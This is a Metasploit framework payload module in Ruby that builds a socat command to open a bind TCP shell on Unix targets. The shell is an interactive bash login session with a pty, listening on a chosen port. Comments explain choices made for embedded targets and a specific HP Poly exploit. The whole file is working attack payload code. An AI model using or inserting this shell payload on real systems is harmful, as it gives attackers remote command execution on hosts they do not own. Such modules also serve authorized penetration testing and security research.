##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 64

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (via socat)',
        'Description' => 'Creates an interactive shell via socat',
        'Author' => 'sfewer-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'socat',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('SocatPath', [true, 'The path to the Socat executable', 'socat']),
        OptString.new('BashPath', [true, 'The path to the shell executable', 'bash'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    # * We allow a custom socat and bash path be specified as some embedded systems may have them in non-standard locations.
    # * We use the shorthand tcp-l instead of tcp-listen to save a few characters.
    # * We do not use fork with tcp-l, so this payload will only handle one connection and is not persistent.
    # * We exec a shell, but do not pass the -li arguments. This is to avoid a whitespace in the exec string, which for
    # some exploits (HP Poly CVE-2026-0826) incur an encoding issue that cannot be solved via an encoder like IFS.
    # * We make the shell an interactive login shell by using the login and pty options for socat.
    # * We use setsid to make the shell run in a new session, which should ensure stability if the parent dies.
    # * We use stderr so error message are visible.
    # * We use sigint to pass ctrl-c to the shell and not kill socat.
    # * We use sane to try and clean up any terminal character issues and start from a default state.
    "#{datastore['SocatPath']} tcp-l:#{datastore['LPORT']} exec:'#{datastore['BashPath']}',login,pty,stderr,setsid,sigint,sane"
  end
end
